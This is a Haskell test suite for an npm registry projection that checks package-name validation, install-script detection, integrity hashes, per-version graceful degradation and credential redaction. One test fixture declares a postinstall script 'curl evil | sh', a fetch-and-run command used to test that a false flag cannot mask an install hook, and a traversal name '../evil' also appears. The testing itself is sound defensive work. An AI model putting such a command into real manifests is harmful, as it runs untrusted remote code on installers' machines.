-- SPDX-FileCopyrightText: 2026 Alexandra de Wit
--
-- SPDX-License-Identifier: MIT

module Ecluse.Core.Registry.Npm.ProjectSpec (spec) where

import Data.Aeson (Value (Number, Object, String), encode, object, (.=))
import Data.Aeson.Key qualified as Key
import Data.Aeson.KeyMap qualified as KeyMap
import Data.ByteString.Lazy qualified as BL
import Data.Map.Strict qualified as Map
import Data.Text qualified as T
import Data.Text.Short qualified as TS
import Data.Time (UTCTime)
import Data.Time.Format.ISO8601 (iso8601ParseM)
import Hedgehog (PropertyT, annotateShow, forAll)
import Hedgehog qualified as H
import Hedgehog.Gen qualified as Gen
import Hedgehog.Range qualified as Range
import Test.Hspec (Spec, describe, it, shouldBe, shouldNotBe, shouldNotSatisfy, shouldSatisfy)
import Test.Hspec.Hedgehog (hedgehog)

import Ecluse.Core.Ecosystem (Ecosystem (Npm))
import Ecluse.Core.Package (
    Artifact (artFilename, artHashes, artInterpreter, artKind, artProvenance, artSize, artUrl, artYanked),
    ArtifactKind (Tarball),
    Availability (Available, Deprecated),
    CodeExecSignal (NoCodeOnInstall, RunsCodeOnInstall),
    HashAlg (SHA1, SRI),
    InvalidEntry (invalidKey, invalidKind, invalidValue),
    InvalidEntryKind (InvalidDistTag, InvalidPublishTime, InvalidVersionManifest),
    PackageDetails (..),
    PackageInfo (..),
    PackageName,
    Person (Person),
    Trust (TrustUnknown),
    mkPackageName,
    mkScope,
    pkgCanonical,
 )
import Ecluse.Core.Registry (ParseError (ParseError), RegistryResponse (RegistryResponse))
import Ecluse.Core.Registry.Npm.Project (
    npmNameLeadChars,
    parsePackageInfoFromValue,
    parseVersionList,
    projectName,
    projectScope,
 )
import Ecluse.Core.Registry.WireSupport (Projection (NameMismatch, Projected))
import Ecluse.Core.Version (Version, mkVersion, renderVersion)
import Ecluse.Test.Json (genJsonText, genKey, genValue)
import Ecluse.Test.Package (unsafeHash, unscopedNpm)
import Ecluse.Test.Registry.Npm qualified as NpmFixture
import Ecluse.Test.Support (decodeJsonOrFail, expectRight)

-- | Exercise the production npm projection against wire and decoded inputs.
spec :: Spec
spec = do
    nameGrammarSpec
    leadCharacterSpec
    asciiBoundarySpec
    npmValidatorRefusalSpec
    nameValidationSpec
    signalMappingSpec
    integritySpec
    versionListSpec
    versionLevelLeniencySpec
    gracefulDegradationSpec
    dropRedactionSpec
    totalitySpec

-- | Require each npm entry point to accept the shared name-grammar fixtures.
nameGrammarSpec :: Spec
nameGrammarSpec = describe "projectName -- the one npm name grammar" $ do
    for_ NpmFixture.npmNameVerdicts $ \(raw, valid) ->
        it (NpmFixture.nameVerdictLabel raw valid) $
            isRight (projectName raw) `shouldBe` valid

    it "splits a scoped name into its scope and its bare name" $
        projectName "@babel/code-frame"
            `shouldBe` Right (mkPackageName Npm (Just (mkScope "babel")) "code-frame")

    it "reads an unscoped name whole" $
        projectName "left-pad" `shouldBe` Right (mkPackageName Npm Nothing "left-pad")

{- The characters a name may begin with, which the store walk partitions a name space by. They are
sieved out of ASCII by this module's own grammar, so these cases pin the sieve against the parser. -}
leadCharacterSpec :: Spec
leadCharacterSpec = describe "npmNameLeadChars" $ do
    it "omits the three leading characters npm's validator refuses" $
        filter (`elem` npmNameLeadChars) ['.', '-', '_'] `shouldBe` []

    it "carries the letters and digits every real name starts with" $
        filter (`notElem` npmNameLeadChars) (['a' .. 'z'] <> ['A' .. 'Z'] <> ['0' .. '9'])
            `shouldBe` []

    it "admits exactly the characters a one-character name parses under" $
        filter (isLeft . projectName . T.singleton) npmNameLeadChars `shouldBe` []

-- | Reject non-ASCII codepoints and ASCII controls independently of Unicode character classes.
asciiBoundarySpec :: Spec
asciiBoundarySpec = describe "projectName -- the ASCII boundary" $ do
    it "refuses a Hangul filler, an invisible that is no format character" $ do
        -- Two distinct names that render identically. Admitting the second one would let an
        -- invisible character dodge a rule written against the first.
        invisibleTwin `shouldNotBe` realName
        projectName realName `shouldSatisfy` isRight
        projectName invisibleTwin `shouldSatisfy` isLeft

    it "refuses a blank braille cell, the other invisible outside the format class" $
        projectName "left-\x2800\&pad" `shouldSatisfy` isLeft

    it "refuses a variation selector, which changes how the glyph before it renders" $
        projectName "left-pad\xFE0F" `shouldSatisfy` isLeft

    it "refuses an accented letter, so the boundary is the charset and not a blocklist" $
        projectName "caf\xE9" `shouldSatisfy` isLeft

    it "phrases each refusal in npm's own wording, so the shared floor is invisible to a caller" $ do
        -- The floor returns a neutral reason. These are the three npm spellings it maps onto,
        -- one per refusal arm, and they are what an operator reads.
        refusalOf "caf\xE9" `shouldBe` Just "non-ASCII npm name component: \"caf\\233\""
        refusalOf "a/b/c" `shouldBe` Just "unusable npm name component: \"a/b/c\""
        refusalOf "@acme/" `shouldBe` Just "empty npm name component"

    it "refuses an ASCII control character, at the low end and at DEL" $ do
        projectName "left\x01\&pad" `shouldSatisfy` isLeft
        projectName "left-pad\x7F" `shouldSatisfy` isLeft

    it "refuses a zero-width space, a right-to-left override, and a soft hyphen" $ do
        projectName "left-\x200B\&pad" `shouldSatisfy` isLeft
        projectName "left-\x202E\&pad" `shouldSatisfy` isLeft
        projectName "left-\xAD\&pad" `shouldSatisfy` isLeft

    it "refuses the boundary breach in the scope, not only in the bare name" $
        projectName "@sco\x3164\&pe/pkg" `shouldSatisfy` isLeft
  where
    realName, invisibleTwin :: Text
    realName = "left-pad"
    invisibleTwin = "left-\x3164\&pad"

-- | Reject npm error-tier names while preserving legacy warning-tier names.
npmValidatorRefusalSpec :: Spec
npmValidatorRefusalSpec = describe "projectName -- npm's own validator tiers" $ do
    it "refuses a character encodeURIComponent would escape" $
        for_ ["left%pad", "left+pad", "left pad", "left,pad", "left$pad"] $ \raw ->
            projectName raw `shouldSatisfy` isLeft

    it "refuses a leading period, hyphen, or underscore on the bare name" $
        for_ [".pad", "-pad", "_pad"] $ \raw ->
            projectName raw `shouldSatisfy` isLeft

    it "refuses the same three leading characters on the scope" $
        for_ ["@.scope/pkg", "@-scope/pkg", "@_scope/pkg"] $ \raw ->
            projectName raw `shouldSatisfy` isLeft

    it "refuses node_modules and favicon.ico, in whatever case they are written" $
        for_ ["node_modules", "Node_Modules", "favicon.ico", "FAVICON.ICO"] $ \raw ->
            projectName raw `shouldSatisfy` isLeft

    it "parses a capitalised legacy name, so JSONStream still resolves" $
        projectName "JSONStream" `shouldBe` Right (mkPackageName Npm Nothing "JSONStream")

    it "parses the warning tier's specials, which legacy names carry" $
        for_ ["a~b", "a'b", "a!b", "a(b)", "a*b"] $ \raw ->
            projectName raw `shouldSatisfy` isRight

    it "parses an interior period, hyphen, and underscore" $
        projectName "lodash.merge_x-1" `shouldSatisfy` isRight

    it "accepts a name of exactly 214 characters" $
        projectName (T.replicate 214 "a") `shouldSatisfy` isRight

    it "refuses a name of 215 characters" $
        projectName (T.replicate 215 "a") `shouldSatisfy` isLeft

    it "counts the scope prefix against the cap, as npm does" $ do
        -- "@scope/" is 7 characters, so 207 is the longest base name that still fits in 214.
        projectName ("@scope/" <> T.replicate 207 "a") `shouldSatisfy` isRight
        projectName ("@scope/" <> T.replicate 208 "a") `shouldSatisfy` isLeft

    it "refuses an over-long scope on its own, the publish allow-list entry point" $
        projectScope (T.replicate 215 "a") `shouldSatisfy` isLeft

    it "measures a scope after its leading @, so both spellings agree at the cap" $ do
        -- The @ is wire punctuation, not part of the scope, so @myorg and myorg are one scope
        -- at 214 characters just as they are below it.
        projectScope (T.replicate 214 "a") `shouldSatisfy` isRight
        projectScope ("@" <> T.replicate 214 "a") `shouldSatisfy` isRight
        projectScope ("@" <> T.replicate 215 "a") `shouldSatisfy` isLeft

nameValidationSpec :: Spec
nameValidationSpec = describe "name validation against the requested name" $ do
    it "projects a document whose self-reported name matches the request" $ do
        case parsePackageInfoFromValue (unscopedNpm "thing") (packumentValueNamed "thing") of
            Right (Projected info) -> renderName (infoName info) `shouldBe` "thing"
            other -> fail ("expected a matching projection, got: " <> show other)

    it "flags a document whose self-reported name disagrees with the request" $ do
        -- A present-but-different name is a NameMismatch carrying the upstream's
        -- self-reported name for the audit log. It is never a rewrite to the route name.
        parsePackageInfoFromValue (unscopedNpm "thing") (packumentValueNamed "other")
            `shouldBe` Right (NameMismatch "other")

    it "validates the scope, not just the bare name (@scope/a is not @scope/b)" $
        parsePackageInfoFromValue (mkPackageName Npm (Just (mkScope "scope")) "a") (packumentValueNamed "@scope/b")
            `shouldBe` Right (NameMismatch "@scope/b")

    it "refuses a document whose self-reported name is not a usable npm name" $
        -- The "../evil" traversal name the URL rewrite must never interpolate. The name gate
        -- runs here, so it is a ParseError, not a PackageName that fails agreement later.
        parsePackageInfoFromValue (unscopedNpm "thing") (packumentValueNamed "../evil")
            `shouldSatisfy` isLeft

    it "never substitutes the served name: a match carries the upstream's own name" $ do
        -- The route name is the validation authority, not a rewrite. infoName is the
        -- name the upstream reported, here equal to the request because it matched.
        case parsePackageInfoFromValue (unscopedNpm "thing") (packumentValueNamed "thing") of
            Right (Projected info) -> infoName info `shouldBe` unscopedNpm "thing"
            other -> fail ("expected a matching projection, got: " <> show other)

signalMappingSpec :: Spec
signalMappingSpec = describe "signal mapping" $ do
    describe "install-script presence → CodeExecSignal" $ do
        it "maps an abbreviated hasInstallScript:true to RunsCodeOnInstall (core-js)" $ do
            d <- projectVersion "core-js.abbreviated.json" (mkVersion Npm "3.49.0")
            pkgInstallCode d `shouldSatisfy` runsCode

        it "derives RunsCodeOnInstall from a full-form postinstall script" $ do
            -- The full manifest has NO hasInstallScript key. The projection derives
            -- presence from `scripts` carrying preinstall, install, or postinstall.
            d <- projectVersionOf fullPostinstallPackument (mkVersion Npm "1.0.0")
            pkgInstallCode d `shouldSatisfy` runsCode

        it "maps no install-script signal to NoCodeOnInstall (is-odd has only `test`)" $ do
            -- is-odd's only script is `test`, which does not run on install.
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgInstallCode d `shouldBe` NoCodeOnInstall
            pkgInstallCode d `shouldNotSatisfy` runsCode

        it "maps an explicit hasInstallScript:false to NoCodeOnInstall" $ do
            -- The abbreviated flag, present and false with no install hook declared in
            -- `scripts`, is a determination that installation runs no code.
            d <- projectVersionOf noInstallScriptPackument (mkVersion Npm "1.0.0")
            pkgInstallCode d `shouldBe` NoCodeOnInstall

        it "fails closed when hasInstallScript:false contradicts a declared postinstall script" $ do
            -- The flag and the `scripts` map are independent wire fields. A hostile upstream must
            -- not mask a real install hook by lying in the flag, so the declared script wins.
            d <- projectVersionOf falseFlagWithPostinstallPackument (mkVersion Npm "1.0.0")
            pkgInstallCode d `shouldSatisfy` runsCode

    describe "deprecated → Availability" $ do
        it "maps a deprecation notice to Deprecated carrying the message (request)" $ do
            d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
            pkgAvailability d
                `shouldBe` Deprecated
                    "request has been deprecated, see https://github.com/request/request/issues/3142"

        it "maps the absence of a notice to Available (is-odd)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgAvailability d `shouldBe` Available

    describe "_npmUser → pkgPublisher" $ do
        it "projects the publisher from the version object (is-odd)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgPublisher d `shouldBe` Just (Person "jonschlinkert" (Just "github@sellside.com") Nothing)

        it "leaves the publisher absent when _npmUser is missing (request)" $ do
            d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
            pkgPublisher d `shouldBe` Nothing

    describe "time[version] → pkgPublishedAt" $ do
        it "fills the publish time from the packument time map (is-odd)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            published <- readUTC "2018-05-31T20:04:53.306Z"
            pkgPublishedAt d `shouldBe` Just published

        it "leaves the publish time Nothing when no time entry exists (abbreviated)" $ do
            d <- projectVersion "core-js.abbreviated.json" (mkVersion Npm "3.49.0")
            pkgPublishedAt d `shouldBe` Nothing

    describe "unfetched trust → TrustUnknown" $
        it "leaves trust unknown (pure projection performs no signature check)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgTrust d `shouldBe` TrustUnknown

    describe "license → pkgLicenses" $ do
        it "projects a bare SPDX string license (is-odd → MIT)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgLicenses d `shouldBe` ["MIT"]

        it "projects the legacy object license to its name (request → Apache-2.0)" $ do
            d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
            pkgLicenses d `shouldBe` ["Apache-2.0"]

integritySpec :: Spec
integritySpec = describe "dist → Artifact integrity" $ do
    it "carries BOTH the SHA-1 shasum and the SRI integrity (is-odd)" $ do
        -- The projection must keep both digests: a cross-upstream merge compares them
        -- to detect a same-version integrity divergence.
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        artHashes (soleArtifact d)
            `shouldBe` [ unsafeHash SRI "sha512-CQpnWPrDwmP1+SMHXZhtLtJv90yiyVfluGsX5iNCVkrhQtU3TQHsUWPG9wkdk9Lgd5yNpAg9jQEo90CBaXgWMA=="
                       , unsafeHash SHA1 "65101baf3727d728b66fa62f50cda7f2d3989601"
                       ]

    it "projects exactly one tarball artifact with the dist URL (is-odd)" $ do
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        length (pkgArtifacts d) `shouldBe` 1
        artKind (soleArtifact d) `shouldBe` Tarball
        artUrl (soleArtifact d) `shouldBe` "https://registry.npmjs.org/is-odd/-/is-odd-3.0.1.tgz"

    it "derives the artifact filename from the URL's last path segment (is-odd)" $ do
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        artFilename (soleArtifact d) `shouldBe` "is-odd-3.0.1.tgz"

    it "leaves npm-irrelevant artifact fields at their explicit defaults (is-odd)" $ do
        -- npm has no per-file yank, interpreter constraint, or provenance URL on the artifact,
        -- so these stay at their unknown/false defaults. The projection fabricates nothing.
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        let art = soleArtifact d
        artInterpreter art `shouldBe` Nothing
        artYanked art `shouldBe` False
        artProvenance art `shouldBe` Nothing

    it "carries the unpacked size as the artifact size (inline dist)" $ do
        d <- projectVersionOf sizedPackument (mkVersion Npm "1.0.0")
        artSize (soleArtifact d) `shouldBe` Just 6510

    it "falls back to <version>.tgz when the tarball URL has no filename segment" $ do
        -- A dist URL ending in a slash has no last segment, so the filename
        -- falls back to the conventional <version>.tgz form.
        d <- projectVersionOf trailingSlashPackument (mkVersion Npm "1.0.0")
        artFilename (soleArtifact d) `shouldBe` "1.0.0.tgz"

    it "keeps the SRI integrity even when the shasum is absent (inline dist)" $ do
        -- An integrity-only dist still yields the SRI hash (and only it).
        d <- projectVersionOf integrityOnlyPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d)
            `shouldBe` [unsafeHash SRI "sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg=="]

    it "keeps the SHA-1 shasum even when the integrity is absent (inline dist)" $ do
        d <- projectVersionOf shasumOnlyPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` [unsafeHash SHA1 "da39a3ee5e6b4b0d3255bfef95601890afd80709"]

    it "treats an empty-string shasum as no digest (a content-empty digest is absent)" $ do
        d <- projectVersionOf emptyShasumPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` []

    it "treats an empty-string integrity as no digest (a content-empty digest is absent)" $ do
        d <- projectVersionOf emptyIntegrityPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` []

    it "yields a truly hashless artifact when both digests are empty strings" $ do
        d <- projectVersionOf emptyBothPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` []

versionListSpec :: Spec
versionListSpec = describe "parseVersionList" $ do
    it "lists the packument's versions, preserving the raw strings (is-odd)" $ do
        body <- readFixture "is-odd.full.json"
        fmap (map renderVersion) (parseVersionList (RegistryResponse 200 body)) `shouldBe` Right ["3.0.1"]

    it "lists every key for a multi-version inline packument, in key order" $ do
        vs <- expectRight (parseVersionList (RegistryResponse 200 multiVersionPackument))
        map renderVersion vs `shouldBe` ["1.0.0", "1.2.0", "2.0.0"]

-- | One version broken in a required or security-decisive field is dropped from the decision surface, never denying the whole package.
versionLevelLeniencySpec :: Spec
versionLevelLeniencySpec = describe "version-level graceful degradation (one broken version never denies the package)" $ do
    it "drops every version broken in a distinct required field, keeping the healthy one" $ do
        info <- projectInfoOf mixedHealthAndBrokenPackument
        Map.keys (infoVersions info) `shouldBe` ["1.0.0"]

    it "keeps the surviving version's load-bearing artifact intact" $ do
        info <- projectInfoOf mixedHealthAndBrokenPackument
        case Map.lookup "1.0.0" (infoVersions info) of
            Just d -> artUrl (soleArtifact d) `shouldBe` "https://r/mix/-/mix-1.0.0.tgz"
            Nothing -> fail "the healthy version 1.0.0 must survive"

    it "drops a bare-scalar version entry rather than failing the packument" $ do
        -- The projection drops a version whose value is a scalar, not even an object,
        -- rather than failing the whole parse.
        info <- projectInfoOf "{\"name\":\"x\",\"versions\":{\"1.0.0\":42}}"
        Map.keys (infoVersions info) `shouldBe` []

    it "lists only the versions that decode (parseVersionList)" $
        fmap (map renderVersion) (parseVersionList (RegistryResponse 200 mixedHealthAndBrokenPackument))
            `shouldBe` Right ["1.0.0"]

    it "resolves a surviving version's details while a broken sibling is absent" $ do
        d <- projectVersionOf mixedHealthAndBrokenPackument (mkVersion Npm "1.0.0")
        renderVersion (pkgVersion d) `shouldBe` "1.0.0"
        lookupVersionOf mixedHealthAndBrokenPackument (mkVersion Npm "2.0.0")
            >>= (`shouldSatisfy` isNothing)

    it "keeps a version carrying junk advisory fields, degrading the field (production Value path)" $ do
        value <- decodeJsonOrFail advisoryJunkPackument
        case parsePackageInfoFromValue (unscopedNpm "adv") value of
            Right (Projected info) -> do
                Map.keys (infoVersions info) `shouldBe` ["1.0.0", "2.0.0", "3.0.0"]
                case Map.lookup "2.0.0" (infoVersions info) of
                    Just d -> do
                        let art = soleArtifact d
                        artSize art `shouldBe` Nothing
                        artUrl art `shouldBe` "https://r/adv/-/adv-2.0.0.tgz"
                        artHashes art
                            `shouldBe` [unsafeHash SRI "sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg=="]
                    Nothing -> fail "the advisory-junk version 2.0.0 must survive"
                Map.member "3.0.0" (infoVersions info) `shouldBe` True
            other -> fail ("expected a Projected packument, got: " <> show other)

-- | Malformed manifests, tags, and timestamps must not remove a healthy version.
gracefulDegradationSpec :: Spec
gracefulDegradationSpec = describe "graceful per-entry degradation with typed drop-tracking" $ do
    it "serves the sound version while dropping malformed dist-tags/time/version siblings" $ do
        info <- projectInfoOf gracefulDegradationPackument
        Map.keys (infoVersions info) `shouldBe` ["1.0.0"]

    it "records each dropped entry's kind and key in infoInvalidEntries" $ do
        -- Deterministic order: version-manifest drops, then dist-tag, then publish-time,
        -- each ascending by key.
        info <- projectInfoOf gracefulDegradationPackument
        map (\e -> (invalidKind e, invalidKey e)) (infoInvalidEntries info)
            `shouldBe` [ (InvalidVersionManifest, "2.0.0")
                       , (InvalidDistTag, "broken")
                       , (InvalidPublishTime, "1.0.0")
                       ]

    it "preserves each dropped entry's raw offending value for diagnostics" $ do
        -- A drop keeps the raw value an operator needs, not a reason string. The publish-time drop
        -- keeps its raw bad date even though the version's parsed publish time is Nothing.
        info <- projectInfoOf gracefulDegradationPackument
        let valueOf k = invalidValue <$> find ((== k) . invalidKind) (infoInvalidEntries info)
        valueOf InvalidDistTag `shouldBe` Just (Number 5)
        valueOf InvalidPublishTime `shouldBe` Just (String "not-a-date")

    it "folds the sound version's own malformed time to no publish time (still served)" $ do
        info <- projectInfoOf gracefulDegradationPackument
        (pkgPublishedAt =<< Map.lookup "1.0.0" (infoVersions info)) `shouldBe` Nothing

    it "does not track a malformed bookkeeping (created) time as a per-version drop" $ do
        -- 'created' is package-level, not a version's publish time, so a malformed one is not an
        -- InvalidPublishTime. Every tracked publish-time drop is a real version.
        info <- projectInfoOf malformedBookkeepingTimePackument
        filter ((== InvalidPublishTime) . invalidKind) (infoInvalidEntries info) `shouldBe` []

-- | Dropped manifests reach logs, so URL credentials must be removed from their recorded values.
dropRedactionSpec :: Spec
dropRedactionSpec = describe "drop-tracking redaction (a credentialed tarball URL)" $ do
    it "records the dropped manifest's tarball authority, never its URL" $ do
        info <- projectInfoOf credentialedDropPackument
        let rendered = show (infoInvalidEntries info) :: Text
        map invalidKey (infoInvalidEntries info) `shouldBe` ["2.0.0"]
        rendered `shouldSatisfy` (not . T.isInfixOf "hunter2")
        rendered `shouldSatisfy` (not . T.isInfixOf "sig=abc")
        rendered `shouldSatisfy` T.isInfixOf "r:443"

    it "still serves the sound version beside it" $ do
        info <- projectInfoOf credentialedDropPackument
        Map.keys (infoVersions info) `shouldBe` ["1.0.0"]

-- | Untrusted bytes and decoded values must produce results without synchronous exceptions.
totalitySpec :: Spec
totalitySpec = describe "projection totality (arbitrary input never bottoms)" $ do
    it "the live packument projection is total over an arbitrary decoded Value (every version projected through it)" $
        hedgehog (projectionValueIsTotal (\v -> showResult (parsePackageInfoFromValue (routeNameOf v) v)))

    it "the version-list read is total over an arbitrary Value body" $
        hedgehog (projectionIsTotal (showResult . parseVersionList))

    it "the version-list read is total over arbitrary bytes" $
        hedgehog (projectionBytesIsTotal (showResult . parseVersionList))

    it "the body generator reaches both a decodable packument and a rejected body" $
        hedgehog $ do
            v <- forAll genBody
            -- Validate against the body's own self-reported name, so a packument-shaped body
            -- reaches the success arm while arbitrary JSON still rejects.
            let decoded = parsePackageInfoFromValue (routeNameOf v) v
            annotateShow v
            _ <- H.eval (showResult decoded)
            -- Non-vacuity: 'genBody' must reach both the projects-to-domain arm and the rejected-
            -- body arm, so the totality checks above are not all-failures.
            H.cover 5 "projects (Right)" (isRight decoded)
            H.cover 5 "rejects (Left)" (isLeft decoded)

-- | Assert a projection entry is total over an arbitrary 'Value' body.
projectionIsTotal :: (RegistryResponse -> String) -> PropertyT IO ()
projectionIsTotal render = do
    v <- forAll genBody
    annotateShow v
    _ <- H.eval (length (render (RegistryResponse 200 (encodeToBody v))))
    H.success

-- | Malformed bytes must yield a parse failure rather than a crash.
projectionBytesIsTotal :: (RegistryResponse -> String) -> PropertyT IO ()
projectionBytesIsTotal render = do
    bytes <- forAll (Gen.bytes (Range.linear 0 64))
    _ <- H.eval (length (render (RegistryResponse 200 bytes)))
    H.success

-- | Exercise decoded inputs directly, without a serialisation round trip.
projectionValueIsTotal :: (Value -> String) -> PropertyT IO ()
projectionValueIsTotal render = do
    v <- forAll genBody
    annotateShow v
    _ <- H.eval (length (render v))
    H.success

-- | Force a projection result fully by rendering both arms to a 'String'.
showResult :: (Show a) => Either ParseError a -> String
showResult = \case
    Left e -> show e :: String
    Right a -> show a :: String

-- | Encode a generated 'Value' into a strict response body.
encodeToBody :: Value -> ByteString
encodeToBody = BL.toStrict . encode

-- | Bias keys toward recognised fields so generated objects reach the successful projection paths.
packumentKeys :: [Text]
packumentKeys =
    [ "name"
    , "version"
    , "dist-tags"
    , "versions"
    , "time"
    , "dist"
    , "tarball"
    , "shasum"
    , "integrity"
    , "scripts"
    , "license"
    , "deprecated"
    , "hasInstallScript"
    , "_npmUser"
    , "maintainers"
    , "dependencies"
    , "1.0.0"
    , "latest"
    ]

-- | A body generator mixing fully-arbitrary JSON with packument-shaped objects, so a property reaches both the rejecting and the projecting arm.
genBody :: H.Gen Value
genBody = Gen.frequency [(1, genValue packumentKeys), (1, genPackumentish)]

-- | Bias object shape toward a packument while keeping field values arbitrary.
genPackumentish :: H.Gen Value
genPackumentish = do
    name <- Gen.text (Range.linear 1 8) Gen.alphaNum
    versionObj <- genVersionish
    extra <- Gen.list (Range.linear 0 3) ((,) <$> genKey packumentKeys <*> genValue packumentKeys)
    pure . Object . KeyMap.fromList $
        [ (Key.fromText "name", String name)
        , (Key.fromText "versions", Object (KeyMap.singleton (Key.fromText "1.0.0") versionObj))
        ]
            <> extra

-- | Generate version-shaped objects that can reach artifact projection.
genVersionish :: H.Gen Value
genVersionish = do
    tarball <- genJsonText
    extra <- Gen.list (Range.linear 0 3) ((,) <$> genKey packumentKeys <*> genValue packumentKeys)
    pure . Object . KeyMap.fromList $
        [ (Key.fromText "name", String "pkg")
        , (Key.fromText "version", String "1.0.0")
        , (Key.fromText "dist", Object (KeyMap.singleton (Key.fromText "tarball") (String tarball)))
        ]
            <> extra

-- | Derive install-script presence from postinstall when its summary flag is absent.
fullPostinstallPackument :: ByteString
fullPostinstallPackument =
    "{\"name\":\"derived\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\"1.0.0\":\
    \{\"name\":\"derived\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node x.js\"},\
    \\"dist\":{\"tarball\":\"https://r/derived/-/derived-1.0.0.tgz\"}}}}"

-- | A full-form packument whose single version sets @hasInstallScript:false@ explicitly, so install presence is a determination rather than a derivation.
noInstallScriptPackument :: ByteString
noInstallScriptPackument =
    "{\"name\":\"noscript\",\"versions\":{\"1.0.0\":{\"name\":\"noscript\",\"version\":\"1.0.0\",\
    \\"hasInstallScript\":false,\"dist\":{\"tarball\":\"https://r/noscript/-/noscript-1.0.0.tgz\"}}}}"

-- | A packument whose version sets @hasInstallScript:false@ but declares a real @postinstall@ script.
falseFlagWithPostinstallPackument :: ByteString
falseFlagWithPostinstallPackument =
    "{\"name\":\"liar\",\"versions\":{\"1.0.0\":{\"name\":\"liar\",\"version\":\"1.0.0\",\
    \\"hasInstallScript\":false,\"scripts\":{\"postinstall\":\"curl evil | sh\"},\
    \\"dist\":{\"tarball\":\"https://r/liar/-/liar-1.0.0.tgz\"}}}}"

-- | A packument whose version's @dist@ reports an @unpackedSize@.
sizedPackument :: ByteString
sizedPackument =
    "{\"name\":\"sized\",\"versions\":{\"1.0.0\":{\"name\":\"sized\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/sized/-/sized-1.0.0.tgz\",\"unpackedSize\":6510}}}}"

-- | A packument whose tarball URL ends in a slash (no filename segment).
trailingSlashPackument :: ByteString
trailingSlashPackument =
    "{\"name\":\"slash\",\"versions\":{\"1.0.0\":{\"name\":\"slash\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/slash/\"}}}}"

-- | A packument whose version's @dist@ carries only the SRI @integrity@.
integrityOnlyPackument :: ByteString
integrityOnlyPackument =
    "{\"name\":\"intg\",\"versions\":{\"1.0.0\":{\"name\":\"intg\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/intg/-/intg-1.0.0.tgz\",\"integrity\":\"sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==\"}}}}"

-- | A packument whose version's @dist@ carries only the legacy SHA-1 @shasum@.
shasumOnlyPackument :: ByteString
shasumOnlyPackument =
    "{\"name\":\"sha\",\"versions\":{\"1.0.0\":{\"name\":\"sha\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/sha/-/sha-1.0.0.tgz\",\"shasum\":\"da39a3ee5e6b4b0d3255bfef95601890afd80709\"}}}}"

-- | An empty shasum must contribute no digest.
emptyShasumPackument :: ByteString
emptyShasumPackument =
    "{\"name\":\"es\",\"versions\":{\"1.0.0\":{\"name\":\"es\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/es/-/es-1.0.0.tgz\",\"shasum\":\"\"}}}}"

-- | An empty integrity string must contribute no digest.
emptyIntegrityPackument :: ByteString
emptyIntegrityPackument =
    "{\"name\":\"ei\",\"versions\":{\"1.0.0\":{\"name\":\"ei\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/ei/-/ei-1.0.0.tgz\",\"integrity\":\"\"}}}}"

-- | Empty digest fields must leave the artifact hashless.
emptyBothPackument :: ByteString
emptyBothPackument =
    "{\"name\":\"eb\",\"versions\":{\"1.0.0\":{\"name\":\"eb\",\"version\":\"1.0.0\",\
    \\"dist\":{\"tarball\":\"https://r/eb/-/eb-1.0.0.tgz\",\"shasum\":\"\",\"integrity\":\"\"}}}}"

-- | One valid version must survive three independently malformed siblings.
mixedHealthAndBrokenPackument :: ByteString
mixedHealthAndBrokenPackument =
    "{\"name\":\"mix\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\
    \\"1.0.0\":{\"name\":\"mix\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/mix/-/mix-1.0.0.tgz\"}},\
    \\"2.0.0\":{\"name\":\"mix\",\"version\":\"2.0.0\",\"dist\":5},\
    \\"3.0.0\":{\"name\":\"mix\",\"version\":\"3.0.0\",\"dist\":{\"shasum\":\"abc\"}},\
    \\"4.0.0\":42}}"

-- | A packument whose 1.0.0 is sound beside a malformed sibling in every per-entry-lenient axis.
gracefulDegradationPackument :: ByteString
gracefulDegradationPackument =
    "{\"name\":\"mix\",\"dist-tags\":{\"latest\":\"1.0.0\",\"broken\":5},\"versions\":{\
    \\"1.0.0\":{\"name\":\"mix\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/mix/-/mix-1.0.0.tgz\"}},\
    \\"2.0.0\":{\"name\":\"mix\",\"version\":\"2.0.0\",\"dist\":5}},\
    \\"time\":{\"created\":\"2018-01-01T00:00:00.000Z\",\"1.0.0\":\"not-a-date\"}}"

